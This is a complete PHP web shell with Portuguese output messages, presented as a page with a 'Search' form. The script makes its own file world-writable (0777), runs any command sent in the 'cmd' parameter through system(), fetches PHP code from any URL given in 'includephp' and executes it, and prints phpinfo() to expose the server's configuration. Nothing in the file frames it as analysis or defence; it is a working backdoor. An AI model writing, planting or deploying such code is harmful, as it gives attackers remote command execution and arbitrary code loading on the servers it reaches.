<html>
<head>
<meta charset="UTF-8">
</head>
<body>
<pre>
<?php
$shellExecEnabled = function_exists('shell_exec') ? 'Y' : 'N';
$systemEnabled = function_exists('system') ? 'Y' : 'N';

echo "shell_exec habilitado: $shellExecEnabled\n";
echo "system habilitado: $systemEnabled\n";

$filename = basename($_SERVER['PHP_SELF']);
$permissions = fileperms($filename);

echo "\nPermissões atuais do arquivo $filename: " . sprintf('%04o', $permissions) . "\n";

if ($permissions !== 0777) {
    if (chmod($filename, 0777)) {
        echo "Permissões do arquivo $filename alteradas para 777\n";
    } else {
        echo "Não foi possível alterar as permissões do arquivo $filename para 777\n";
    }
} else {
    echo "Permissões do arquivo $filename já são 777\n";
}

?>
</pre>

<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Search">
</form>
<pre>
<?php
if(isset($_GET['includephp'])) {
    $includeUrl = $_GET['includephp'];
    $includeContent = file_get_contents($includeUrl);
    
    if($includeContent !== false) {
        $tempFile = tempnam(sys_get_temp_dir(), "inc");
        file_put_contents($tempFile, $includeContent);
        include $tempFile;
        unlink($tempFile);
    } else {
        echo "Error. Cannot show file.";
    }
} elseif(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
phpinfo();
?>
</pre>
</body>
</html>
